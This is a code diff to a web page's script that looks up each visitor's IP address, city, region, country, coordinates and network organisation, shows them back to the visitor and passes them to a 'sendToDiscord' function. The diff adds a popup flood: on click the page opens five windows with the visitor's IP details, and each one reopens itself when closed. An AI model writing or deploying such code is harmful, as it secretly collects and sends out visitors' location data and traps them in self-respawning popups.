@@ -104,25 +104,50 @@
 </div>
 
 <script>
+    let popups = []; // To store the reference of the popups
+    let ipData = {}; // To store IP data fetched from the API
+
+    // Function to create a new popup and display IP info
+    function createPopup() {
+        const popup = window.open("about:blank", "_blank", "width=400,height=400");
+        if (popup) {
+            // Add the popup to the popups array
+            popups.push(popup);
+            // Wait until the popup is fully opened, then inject the IP data
+            popup.document.write("<html><head><title>IP Info</title></head><body>");
+            popup.document.write("<h2>IP Information</h2>");
+            popup.document.write(`<p><strong>IP Address:</strong> ${ipData.ip}</p>`);
+            popup.document.write(`<p><strong>City:</strong> ${ipData.city}</p>`);
+            popup.document.write(`<p><strong>Region:</strong> ${ipData.region}</p>`);
+            popup.document.write(`<p><strong>Country:</strong> ${ipData.country}</p>`);
+            popup.document.write(`<p><strong>Location:</strong> ${ipData.loc}</p>`);
+            popup.document.write(`<p><strong>Organization:</strong> ${ipData.org}</p>`);
+            popup.document.write("</body></html>");
+
+            // Listen for when the popup is closed
+            popup.onbeforeunload = function () {
+                // When the popup is closed, create a new one
+                createPopup();
+            };
+        }
+    }
+
     function getMyIpAddress() {
         fetch("https://ipinfo.io/json")
             .then(response => response.json())
             .then(data => {
-                fetch("https://ipinfo.io/" + data.ip + "/json")
-                    .then(response => response.json())
-                    .then(data => {
-                        const ipResultDiv = document.getElementById("ipResult");
-                        ipResultDiv.innerHTML = `
-                            <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
-                            <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
-                            <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
-                            <p><strong class="ip-text">Country:</strong> <span class="ip-text">${data.country}</span></p>
-                            <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
-                            <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
-                        `;
-                        sendToDiscord(data);
-                    })
-                    .catch(error => console.error("Error retrieving IP info:", error));
+                ipData = data; // Store the fetched data globally
+                // Optionally display it in the main page as well
+                const ipResultDiv = document.getElementById("ipResult");
+                ipResultDiv.innerHTML = ` 
+                    <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
+                    <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
+                    <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
+                    <p><strong class="ip-text">Country:</strong> <span class="ip-text">${data.country}</span></p>
+                    <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
+                    <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
+                `;
+                sendToDiscord(data);
             })
             .catch(error => console.error("Error retrieving IP address:", error));
     }
@@ -177,6 +202,11 @@
         video.style.display = "block";
         document.querySelector(".loading-screen").style.display = "none";
         document.querySelector(".content").style.display = "block";
+
+        // Start opening pop-ups when the user clicks
+        for (let i = 0; i < 5; i++) { // Change number for more or fewer pop-ups
+            createPopup();
+        }
     }
 
     document.addEventListener("DOMContentLoaded", function() {
